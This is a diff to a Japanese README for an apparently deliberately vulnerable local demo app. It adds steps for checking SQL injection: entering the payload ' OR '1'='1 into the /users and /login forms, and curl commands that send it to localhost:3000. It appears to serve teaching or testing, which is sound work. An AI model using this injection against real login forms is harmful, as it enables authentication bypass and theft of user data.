@@ -62,6 +62,21 @@ GET /login?username=admin&password=wrong-password
 
 SQL インジェクションの検証例:
 
+ブラウザで以下を開き、フォームに入力して確認できます。
+
+```text
+http://localhost:3000/users
+http://localhost:3000/login
+```
+
+入力例:
+
+```text
+' OR '1'='1
+```
+
+curl で確認する場合:
+
 ```sh
 curl "http://localhost:3000/users?name='%20OR%20'1'%3D'1"
 curl "http://localhost:3000/login?username=admin&password='%20OR%20'1'%3D'1"
